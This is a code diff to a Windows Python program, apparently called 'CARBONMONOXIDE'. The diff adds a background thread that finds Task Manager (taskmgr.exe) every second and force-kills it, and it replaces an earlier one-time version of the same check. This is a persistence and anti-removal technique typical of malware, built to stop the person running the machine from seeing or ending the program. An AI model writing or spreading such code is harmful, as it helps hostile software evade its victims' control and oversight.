@@ -10,22 +10,28 @@ import pyfiglet
 from win32api import RGB
 from ctypes import wintypes
 import os
+import psutil
 
+# =================== Task Manager Detection ===================
+def check_and_kill_taskmgr():
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
+            os.system('taskkill /F /IM taskmgr.exe')
+            print("Task Manager detected and killed.")
+            break
 
-class no_taskmanager():
-    def is_running(process_name):
-        tasks = os.popen('tasklist /FI "IMAGENAME eq {}" /NH'.format(process_name)).read().strip()
-        return process_name.lower() in tasks.lower()
-    
-    try:
-        if is_running("taskmgr.exe"):
-            os.system("taskkill /F /IM taskmgr.exe")
-    except Exception as e:
-        print(f"Error checking task manager: {e}")
-        pass
-   
+def start_taskmgr_monitor():
+    def monitor_loop():
+        while True:
+            check_and_kill_taskmgr()
+            time.sleep(1)  # check every 1 second
 
-    
+    t = threading.Thread(target=monitor_loop, daemon=True)
+    t.start()
+    return t
+
+thread = start_taskmgr_monitor()
+
 
 pyfiglet.print_figlet("CARBONMONOXIDE", font="ansi_shadow", colors="CYAN")
 
@@ -423,7 +429,6 @@ def main():
 
     try:
         while True:
-            threading.Thread(target=no_taskmanager.is_running, args=("taskmgr.exe",)).start()
             try:
                 manager.run()
             except StopIteration:
